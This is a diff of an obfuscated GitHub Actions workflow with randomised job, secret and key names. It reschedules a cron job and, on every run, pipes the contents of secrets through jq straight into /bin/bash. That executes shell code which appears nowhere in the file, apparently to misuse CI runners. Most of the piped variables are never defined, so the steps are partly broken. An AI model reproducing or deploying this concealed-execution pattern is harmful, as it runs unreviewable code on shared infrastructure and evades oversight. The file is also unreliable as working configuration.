@@ -1,28 +1,29 @@
 name: mingrixiu2345
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '4 4/6 * * *'
-jobs:  # 6545
+    - cron: '36 1/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: mingrixiu2345
         env:
-          r8898: ${{ secrets.r8898 }}
+          rnhue3: ${{ secrets.rnhue3 }}
         run: |
-          echo $r8898 | jq -r .gb73 | /bin/bash
-          echo $mjow371 | jq -r .tm2 | /bin/bash
-          echo $trwjj310 | jq -r .iks259 | /bin/bash
-          echo $ri02 | jq -r .rf5 | /bin/bash
-          echo $afn21922 | jq -r .oespo68958 | /bin/bash
-          echo $elk01 | jq -r .t311 | /bin/bash
-          echo $b245 | jq -r .ehj28 | /bin/bash
-          echo $j1539 | jq -r .txey596 | /bin/bash
-          echo $pfoi9408 | jq -r .x55911 | /bin/bash
-          echo $a283 | jq -r .tsw6140 | /bin/bash
-          echo $f77006 | jq -r .kkvs4164 | /bin/bash
-          echo $fpmjc512 | jq -r .ay78698 | /bin/bash
-          echo $q6 | jq -r .cx18 | /bin/bash
+          echo $rnhue3 | jq -r .jnn139 | /bin/bash
+          echo $tp8 | jq -r .ogvx67 | /bin/bash
+          echo $d76 | jq -r .m08047 | /bin/bash
+          echo $f99 | jq -r .ngrl577 | /bin/bash
+          echo $mpti7 | jq -r .icsse231 | /bin/bash
+          echo $j354 | jq -r .so85622 | /bin/bash
+          echo $gi9887 | jq -r .mqe2507 | /bin/bash
+          echo $sp8601 | jq -r .ofren22 | /bin/bash
+          echo $ftj13 | jq -r .botc56 | /bin/bash
+          echo $huaho33 | jq -r .knkd87 | /bin/bash
+          echo $dtbi58 | jq -r .okjv4 | /bin/bash
+          echo $cqqty01 | jq -r .b8736 | /bin/bash
+          echo $qv79899 | jq -r .bxm264 | /bin/bash
 
